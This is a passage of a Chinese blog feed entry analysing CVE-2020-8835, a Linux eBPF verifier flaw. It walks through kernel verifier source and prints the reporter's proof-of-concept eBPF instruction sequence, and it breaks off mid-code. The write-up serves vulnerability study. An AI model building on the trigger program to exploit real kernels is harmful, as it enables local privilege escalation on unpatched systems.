        <category>学习日记</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2020-8835: Linux eBPF模块verifier组件漏洞分析</title>
    <url>/2020/04/21/CVE-2020-8835-Linux-eBPF%E6%A8%A1%E5%9D%97verifier%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>首发自安全客：<a href="https://www.anquanke.com/post/id/203284" target="_blank" rel="noopener">https://www.anquanke.com/post/id/203284</a></p>
<a id="more"></a>

<h1 id="eBPF简介"><a href="#eBPF简介" class="headerlink" title="eBPF简介"></a>eBPF简介</h1><blockquote>
<p>bpf系统调用执行一系列与extended Berkeley Packet Filters相关的操作，eBPF与传统的BPF相似，作用为 过滤网络包。对于eBPF和传统的BPF来说，为了确保它们进行的操作不会损伤运行时的系统，内核会在加载程序之前静态地分析它们。</p>
</blockquote>
<p>简而言之，eBPF可以加载数据过滤代码到内核，并在进行相关操作的时候触发代码</p>
<p>通常见到的seccomp沙箱就是使用了eBPF模块</p>
<h2 id="eBPF程序的载入"><a href="#eBPF程序的载入" class="headerlink" title="eBPF程序的载入"></a>eBPF程序的载入</h2><h3 id="bpf-insn"><a href="#bpf-insn" class="headerlink" title="bpf_insn"></a>bpf_insn</h3><p><code>bpf_insn</code>是一个结构体，代表一条eBPF指令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">	__u8	code;		<span class="comment">/* opcode */</span></span><br><span class="line">	__u8	dst_reg:<span class="number">4</span>;	<span class="comment">/* dest register */</span></span><br><span class="line">	__u8	src_reg:<span class="number">4</span>;	<span class="comment">/* source register */</span></span><br><span class="line">	__s16	off;		<span class="comment">/* signed offset */</span></span><br><span class="line">	__s32	imm;		<span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>每一个eBPF程序都是一个<code>bpf_insn</code>数组，使用bpf系统调用将其载入内核</p>
<p>具体每个字段的含义可以随之后的分析进行了解</p>
<h3 id="bpf-prog-load"><a href="#bpf-prog-load" class="headerlink" title="bpf_prog_load"></a>bpf_prog_load</h3><p>要将eBPF程序载入内核中，需要使用bpf系统调用</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_BPF 321</span></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type type,</span></span></span><br><span class="line"><span class="function"><span class="params">				  <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> insn_cnt,</span></span></span><br><span class="line"><span class="function"><span class="params">				  <span class="keyword">const</span> <span class="keyword">char</span> *license)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;</span><br><span class="line">		.prog_type = type,</span><br><span class="line">		.insns = ptr_to_u64(insns),</span><br><span class="line">		.insn_cnt = insn_cnt,</span><br><span class="line">		.license = ptr_to_u64(license),</span><br><span class="line">		.log_buf = ptr_to_u64(bpf_log_buf),</span><br><span class="line">		.log_size = LOG_BUF_SIZE,</span><br><span class="line">		.log_level = <span class="number">1</span>,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> syscall(__NR_BPF, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中，<code>type</code>表示eBPF程序类型，不同类型的程序作用不同，例如当<code>type</code>为<code>BPF_PROG_TYPE_SOCKET_FILTER</code>时，表示该程序的作用是过滤进出口网络报文</p>
<p><code>insns</code>是<code>bpf_insn</code>数组，表示该程序的指令</p>
<p><code>insn_cnt</code>表示指令的条数</p>
<p><code>license</code>必须为<code>&quot;GPL&quot;</code></p>
<p><code>bpf_log_bpf</code>中存储的是log信息，可以在程序载入内核之后打印它，能获取比较详细的验证时信息</p>
<h3 id="load-prog"><a href="#load-prog" class="headerlink" title="load_prog"></a>load_prog</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">load_prog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] = &#123;</span></span><br><span class="line">        ……</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		指令……</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="keyword">return</span> bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, <span class="keyword">sizeof</span>(prog)/<span class="keyword">sizeof</span>(struct bpf_insn), <span class="string">"GPL"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如此这般，如何在用户态将一个eBPF程序载入内核就清楚了</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>2020年3月30日，漏洞作者分享了他触发漏洞的一段<code>eBPF</code>程序[1]</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: (b7) r0 = <span class="number">808464432</span></span><br><span class="line"><span class="number">1</span>: (<span class="number">7f</span>) r0 &gt;&gt;= r0</span><br><span class="line"><span class="number">2</span>: (<span class="number">14</span>) w0 -= <span class="number">808464432</span></span><br><span class="line"><span class="number">3</span>: (<span class="number">07</span>) r0 += <span class="number">808464432</span></span><br><span class="line"><span class="number">4</span>: (b7) r1 = <span class="number">808464432</span></span><br><span class="line"><span class="number">5</span>: (de) <span class="keyword">if</span> w1 s&lt;= w0 <span class="keyword">goto</span> pc+<span class="number">0</span></span><br><span class="line"><span class="number">6</span>: (<span class="number">07</span>) r0 += <span class="number">-2144337872</span></span><br><span class="line"><span class="number">7</span>: (<span class="number">14</span>) w0 -= <span class="number">-1607454672</span></span><br><span class="line"><span class="number">8</span>: (<span class="number">25</span>) <span class="keyword">if</span> r0 &gt; <span class="number">0x30303030</span> <span class="keyword">goto</span> pc+<span class="number">0</span></span><br><span class="line"><span class="number">9</span>: (<span class="number">76</span>) <span class="keyword">if</span> w0 s&gt;= <span class="number">0x303030</span> <span class="keyword">goto</span> pc+<span class="number">2</span></span><br><span class="line"><span class="number">10</span>: (<span class="number">05</span>) <span class="keyword">goto</span> pc<span class="number">-1</span></span><br><span class="line"><span class="number">11</span>: (<span class="number">05</span>) <span class="keyword">goto</span> pc<span class="number">-1</span></span><br><span class="line"><span class="number">12</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>这段程序触发会使当前进程空转，陷入死循环</p>
<p>乍一看，两个<code>goto pc-1</code>，当然会陷入死循环了，那这个Poc还有什么参考价值？</p>
<h2 id="bpf-check"><a href="#bpf-check" class="headerlink" title="bpf_check"></a>bpf_check</h2><p>以<code>Linux v5.6-rc5</code>的代码为例[2]，源码文件于[4]下载</p>
<p>在使用<code>bpf</code>系统调用将<code>eBPF</code>程序载入内核时，内核会对载入的程序进行合法性检测，以此来保证程序的安全性</p>
<p>在<code>bpf_check</code>中有两个主要的检查，一个是<code>check_cfg</code>，检查程序流程图，另一个是<code>do_check_main</code>，模拟执行程序来检查是否有非法操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_check</span><span class="params">(struct bpf_prog **prog, <span class="keyword">union</span> bpf_attr *attr,</span></span></span><br><span class="line"><span class="function"><span class="params">	      <span class="keyword">union</span> bpf_attr __user *uattr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u64 start_time = ktime_get_ns();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_verifier_env</span> *<span class="title">env</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_verifier_log</span> *<span class="title">log</span>;</span></span><br><span class="line">	<span class="keyword">int</span> i, len, ret = -EINVAL;</span><br><span class="line">	<span class="keyword">bool</span> is_priv;</span><br><span class="line"></span><br><span class="line">	……</span><br><span class="line">    ret = check_cfg(env);		&lt;------------</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> skip_full_check;</span><br><span class="line"></span><br><span class="line">	ret = do_check_subprogs(env);</span><br><span class="line">	ret = ret ?: do_check_main(env);	&lt;-------------</span><br><span class="line"></span><br><span class="line">	……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="check-cfg"><a href="#check-cfg" class="headerlink" title="check_cfg"></a>check_cfg</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">check_cfg</span><span class="params">(struct bpf_verifier_env *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> *<span class="title">insns</span> = <span class="title">env</span>-&gt;<span class="title">prog</span>-&gt;<span class="title">insnsi</span>;</span></span><br><span class="line">	<span class="keyword">int</span> insn_cnt = env-&gt;prog-&gt;len;</span><br><span class="line">	<span class="keyword">int</span> *insn_stack, *insn_state;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i, t;</span><br><span class="line"></span><br><span class="line">	insn_state = env-&gt;cfg.insn_state = kvcalloc(insn_cnt, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!insn_state)</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">	insn_stack = env-&gt;cfg.insn_stack = kvcalloc(insn_cnt, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!insn_stack) &#123;</span><br><span class="line">		kvfree(insn_state);</span><br><span class="line">		<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	insn_state[<span class="number">0</span>] = DISCOVERED; <span class="comment">/* mark 1st insn as discovered */</span></span><br><span class="line">	insn_stack[<span class="number">0</span>] = <span class="number">0</span>; <span class="comment">/* 0 is the first instruction */</span></span><br><span class="line">	env-&gt;cfg.cur_stack = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">peek_stack:</span><br><span class="line">	<span class="keyword">if</span> (env-&gt;cfg.cur_stack == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> check_state;</span><br><span class="line">	t = insn_stack[env-&gt;cfg.cur_stack - <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (BPF_CLASS(insns[t].code) == BPF_JMP ||</span><br><span class="line">	    BPF_CLASS(insns[t].code) == BPF_JMP32) &#123;</span><br><span class="line">		u8 opcode = BPF_OP(insns[t].code);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (opcode == BPF_EXIT) &#123;</span><br><span class="line">			<span class="keyword">goto</span> mark_explored;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_CALL) &#123;</span><br><span class="line">			ret = push_insn(t, t + <span class="number">1</span>, FALLTHROUGH, env, <span class="literal">false</span>);</span><br><span class="line">			<span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">				<span class="keyword">goto</span> peek_stack;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> err_free;</span><br><span class="line">			<span class="keyword">if</span> (t + <span class="number">1</span> &lt; insn_cnt)</span><br><span class="line">				init_explored_state(env, t + <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">if</span> (insns[t].src_reg == BPF_PSEUDO_CALL) &#123;</span><br><span class="line">				init_explored_state(env, t);</span><br><span class="line">				ret = push_insn(t, t + insns[t].imm + <span class="number">1</span>, BRANCH,</span><br><span class="line">						env, <span class="literal">false</span>);</span><br><span class="line">				<span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">goto</span> peek_stack;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">					<span class="keyword">goto</span> err_free;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (opcode == BPF_JA) &#123;</span><br><span class="line">			<span class="keyword">if</span> (BPF_SRC(insns[t].code) != BPF_K) &#123;</span><br><span class="line">				ret = -EINVAL;</span><br><span class="line">				<span class="keyword">goto</span> err_free;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">/* unconditional jump with single edge */</span></span><br><span class="line">			ret = push_insn(t, t + insns[t].off + <span class="number">1</span>,	&lt;----------------- <span class="number">1</span></span><br><span class="line">					FALLTHROUGH, env, <span class="literal">true</span>);</span><br><span class="line">			<span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">				<span class="keyword">goto</span> peek_stack;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> err_free;</span><br><span class="line">			<span class="comment">/* unconditional jmp is not a good pruning point,</span></span><br><span class="line"><span class="comment">			 * but it's marked, since backtracking needs</span></span><br><span class="line"><span class="comment">			 * to record jmp history in is_state_visited().</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			init_explored_state(env, t + insns[t].off + <span class="number">1</span>);</span><br><span class="line">			<span class="comment">/* tell verifier to check for equivalent states</span></span><br><span class="line"><span class="comment">			 * after every call and jump</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (t + <span class="number">1</span> &lt; insn_cnt)</span><br><span class="line">				init_explored_state(env, t + <span class="number">1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">/* conditional jump with two edges */</span></span><br><span class="line">			init_explored_state(env, t);</span><br><span class="line">			ret = push_insn(t, t + <span class="number">1</span>, FALLTHROUGH, env, <span class="literal">true</span>);</span><br><span class="line">			<span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">				<span class="keyword">goto</span> peek_stack;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> err_free;</span><br><span class="line"></span><br><span class="line">			ret = push_insn(t, t + insns[t].off + <span class="number">1</span>, BRANCH, env, <span class="literal">true</span>);</span><br><span class="line">			<span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">				<span class="keyword">goto</span> peek_stack;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> err_free;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* all other non-branch instructions with single</span></span><br><span class="line"><span class="comment">		 * fall-through edge</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		ret = push_insn(t, t + <span class="number">1</span>, FALLTHROUGH, env, <span class="literal">false</span>);</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">1</span>)</span><br><span class="line">			<span class="keyword">goto</span> peek_stack;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">goto</span> err_free;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">mark_explored:				&lt;------------------------ <span class="number">2</span></span><br><span class="line">	insn_state[t] = EXPLORED;</span><br><span class="line">	<span class="keyword">if</span> (env-&gt;cfg.cur_stack-- &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		verbose(env, <span class="string">"pop stack internal bug\n"</span>);</span><br><span class="line">		ret = -EFAULT;</span><br><span class="line">		<span class="keyword">goto</span> err_free;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">goto</span> peek_stack;</span><br><span class="line"></span><br><span class="line">check_state:				&lt;------------------------ <span class="number">3</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn_cnt; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (insn_state[i] != EXPLORED) &#123;</span><br><span class="line">			verbose(env, <span class="string">"unreachable insn %d\n"</span>, i);</span><br><span class="line">			ret = -EINVAL;</span><br><span class="line">			<span class="keyword">goto</span> err_free;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ret = <span class="number">0</span>; <span class="comment">/* cfg looks good */</span></span><br><span class="line"></span><br><span class="line">err_free:</span><br><span class="line">	kvfree(insn_state);</span><br><span class="line">	kvfree(insn_stack);</span><br><span class="line">	env-&gt;cfg.insn_state = env-&gt;cfg.insn_stack = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中，<code>insn_state[i]</code>代表第<code>i</code>条指令的状态，<code>EXPLORED</code>表示第<code>i</code>条指令已经被遍历过了</p>
<p>故箭头标记2处，表示标记一条指令被经过，然后再去取下一条指令</p>
<p>箭头3处，有一个<code>for</code>循环来检查所有指令是否已经被遍历过，如果有任何一条指令没有被遍历，则返回错误码，并在log中写入错误信息<code>unreachable insn</code></p>
<p>因此，一个合格的<code>eBPF</code>程序要满足的第一个条件是，没有不可到达的指令</p>
<p>另外，也要注意箭头1处所指的函数<code>pusn_insn</code></p>
<p>在程序中有<code>opcode</code>为<code>BPF_JA</code>，即 “无条件跳转” 的时候，会调用<code>push_insn(t, t + insns[t].off + 1, FALLTHROUGH, env, true);</code>来把下一条指令push入栈</p>
<p>这里，<code>t</code>是当前指令的索引，<code>t+insns[t].off+1</code>是下一条指令的索引</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* t, w, e - match pseudo-code above:</span></span><br><span class="line"><span class="comment"> * t - index of current instruction</span></span><br><span class="line"><span class="comment"> * w - next instruction</span></span><br><span class="line"><span class="comment"> * e - edge</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">push_insn</span><span class="params">(<span class="keyword">int</span> t, <span class="keyword">int</span> w, <span class="keyword">int</span> e, struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="function"><span class="params">		     <span class="keyword">bool</span> loop_ok)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *insn_stack = env-&gt;cfg.insn_stack;</span><br><span class="line">	<span class="keyword">int</span> *insn_state = env-&gt;cfg.insn_state;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (e == FALLTHROUGH &amp;&amp; insn_state[t] &gt;= (DISCOVERED | FALLTHROUGH))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (e == BRANCH &amp;&amp; insn_state[t] &gt;= (DISCOVERED | BRANCH))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (w &lt; <span class="number">0</span> || w &gt;= env-&gt;prog-&gt;len) &#123;</span><br><span class="line">		verbose_linfo(env, t, <span class="string">"%d: "</span>, t);</span><br><span class="line">		verbose(env, <span class="string">"jump out of range from insn %d to %d\n"</span>, t, w);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (e == BRANCH)</span><br><span class="line">		<span class="comment">/* mark branch target for state pruning */</span></span><br><span class="line">		init_explored_state(env, w);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (insn_state[w] == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* tree-edge */</span></span><br><span class="line">		insn_state[t] = DISCOVERED | e;</span><br><span class="line">		insn_state[w] = DISCOVERED;</span><br><span class="line">		<span class="keyword">if</span> (env-&gt;cfg.cur_stack &gt;= env-&gt;prog-&gt;len)</span><br><span class="line">			<span class="keyword">return</span> -E2BIG;</span><br><span class="line">		insn_stack[env-&gt;cfg.cur_stack++] = w;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> ((insn_state[w] &amp; <span class="number">0xF0</span>) == DISCOVERED) &#123;</span><br><span class="line">		<span class="keyword">if</span> (loop_ok &amp;&amp; env-&gt;allow_ptr_leaks)		&lt;----------------- <span class="number">1</span></span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		verbose_linfo(env, t, <span class="string">"%d: "</span>, t);</span><br><span class="line">		verbose_linfo(env, w, <span class="string">"%d: "</span>, w);</span><br><span class="line">		verbose(env, <span class="string">"back-edge from insn %d to %d\n"</span>, t, w);</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (insn_state[w] == EXPLORED) &#123;</span><br><span class="line">		<span class="comment">/* forward- or cross-edge */</span></span><br><span class="line">		insn_state[t] = DISCOVERED | e;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		verbose(env, <span class="string">"insn state internal bug\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>箭头1处，如果<code>insn_state[w]</code>即下一条指令的状态为<code>DISCOVERED</code>，即当前的无条件跳转指令是往回跳的，就会进入箭头1这一分支。这时，<code>loop_ok</code>为1，如果<code>env-&gt;allow_ptr_leaks</code>为0的话，会报错<code>back-edge</code>，如果非0，则会继续运行</p>
<p>那么，<code>env-&gt;allow_ptr_leaks</code>是由什么影响的呢？</p>
<p>在<code>bpf_check</code>函数中有这么两句</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">is_priv = capable(CAP_SYS_ADMIN);</span><br><span class="line">……</span><br><span class="line">env-&gt;allow_ptr_leaks = is_priv;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>意味如果当前用户有<code>CAP_SYS_ADMIN</code>这个权限，那么<code>env-&gt;allow_ptr_leaks</code>就是1，否则就是0 。那么一般我们的用户不是root，没有这个权限，因此<code>env-&gt;allow_ptr_leaks</code>一般为0</p>
<p>这样的话，如果我们的<code>eBPF</code>程序中有往回跳转的指令，<code>push_insn</code>函数就会报错</p>
<p>因此，一个权限一般的合格的<code>eBPF</code>程序要满足的第二个条件是，没有往回跳转的指令</p>
<p>到这里，一般用户能正常通过<code>check_cfg</code>这一个函数所需要的条件就很明白了：</p>
<ul>
<li>没有不可到达的指令</li>
<li>没有往回跳转的指令</li>
<li>没有跳的太远超出指令范围的指令</li>
</ul>
<p>而本文开始所展示的<code>eBPF</code>程序不符合第一个条件和第二个条件，那么它又是如何被载入内核的呢？</p>
<h3 id="do-check-main"><a href="#do-check-main" class="headerlink" title="do_check_main"></a>do_check_main</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_check_main</span><span class="params">(struct bpf_verifier_env *env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">	env-&gt;insn_idx = <span class="number">0</span>;</span><br><span class="line">	ret = do_check_common(env, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!ret)</span><br><span class="line">		env-&gt;prog-&gt;aux-&gt;stack_depth = env-&gt;subprog_info[<span class="number">0</span>].stack_depth;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>do_check_main</code>函数中，调用了<code>do_check_commin</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">do_check_common</span><span class="params">(struct bpf_verifier_env *env, <span class="keyword">int</span> subprog)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	……</span><br><span class="line">	ret = do_check(env);</span><br><span class="line">	……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>且不管其他，我们主要注意的地方是这个<code>do_check</code>函数。在该函数中，内核会模拟执行被载入的程序，并逐条指令检查其合法性。何为不合法？<code>eBPF</code>程序的指令是包括内存存取相关指令的，因此对被存取的指针它会有类型以及范围的限定，而且限定非常严格。如果说限定的部分有漏洞，或者其他的原因导致限定失效，那么将会带来非常恐怖的后果。例如<strong>任意地址读写</strong></p>
<p>在遇到具有分支，例如<code>if xxx goto pc+x</code>这样的语句，内核会检测<code>if</code>判断的条件是否恒成立。若判断为恒成立或者恒不成立，则只分析相应的那一分支，而另一分支则不进行分析。没有被分析到的指令被视为<code>dead code</code></p>
<h2 id="Poc分析"><a href="#Poc分析" class="headerlink" title="Poc分析"></a>Poc分析</h2><p>Poc的c文件链接在文末[3]，注意要用普通用户执行Poc</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: (b7) r0 = <span class="number">808464432</span></span><br><span class="line"><span class="number">1</span>: (<span class="number">7f</span>) r0 &gt;&gt;= r0</span><br><span class="line"><span class="number">2</span>: (<span class="number">14</span>) w0 -= <span class="number">808464432</span></span><br><span class="line"><span class="number">3</span>: (<span class="number">07</span>) r0 += <span class="number">808464432</span></span><br><span class="line"><span class="number">4</span>: (b7) r1 = <span class="number">808464432</span></span><br><span class="line"><span class="number">5</span>: (de) <span class="keyword">if</span> w1 s&lt;= w0 <span class="keyword">goto</span> pc+<span class="number">0</span></span><br><span class="line"><span class="number">6</span>: (<span class="number">07</span>) r0 += <span class="number">-2144337872</span></span><br><span class="line"><span class="number">7</span>: (<span class="number">14</span>) w0 -= <span class="number">-1607454672</span></span><br><span class="line"><span class="number">8</span>: (<span class="number">25</span>) <span class="keyword">if</span> r0 &gt; <span class="number">0x30303030</span> <span class="keyword">goto</span> pc+<span class="number">0</span></span><br><span class="line"><span class="number">9</span>: (<span class="number">76</span>) <span class="keyword">if</span> w0 s&gt;= <span class="number">0x303030</span> <span class="keyword">goto</span> pc+<span class="number">2</span></span><br><span class="line"><span class="number">10</span>: (<span class="number">05</span>) <span class="keyword">goto</span> pc<span class="number">-1</span></span><br><span class="line"><span class="number">11</span>: (<span class="number">05</span>) <span class="keyword">goto</span> pc<span class="number">-1</span></span><br><span class="line"><span class="number">12</span>: (<span class="number">95</span>) <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>首先先回答一个问题，为什么<code>goto pc-1</code>这样不能通过<code>check_cfg</code>的指令会被载入到内核中呢？</p>
<p>答案在<code>bpf_check</code>函数中</p>
<p>就在调用<code>do_check_main</code>那条语句的下方，还有几条代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_priv) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			opt_hard_wire_dead_code_branches(env);</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			ret = opt_remove_dead_code(env);</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			ret = opt_remove_nops(env);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">			sanitize_dead_code(env);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>代码中，<code>is_priv</code>为何物我们已经了解，如果用户为root的话，<code>is_priv</code>为1，用户为具有一般权限的一般用户的话，其为0</p>
<p>关于<code>is_priv</code>为1的情况下内核究竟对<code>eBPF</code>程序做了什么不去细说，总结为一句话就是：内核将<code>dead code</code>全部替换为<code>exit</code>，即退出指令</p>
<p>那么接下来来看<code>sanitize_dead_code</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The verifier does more data flow analysis than llvm and will not</span></span><br><span class="line"><span class="comment"> * explore branches that are dead at run time. Malicious programs can</span></span><br><span class="line"><span class="comment"> * have dead code too. Therefore replace all dead at-run-time code</span></span><br><span class="line"><span class="comment"> * with 'ja -1'.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Just nops are not optimal, e.g. if they would sit at the end of the</span></span><br><span class="line"><span class="comment"> * program and through another bug we would manage to jump there, then</span></span><br><span class="line"><span class="comment"> * we'd execute beyond program memory otherwise. Returning exception</span></span><br><span class="line"><span class="comment"> * code also wouldn't work since we can have subprogs where the dead</span></span><br><span class="line"><span class="comment"> * code could be located.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span 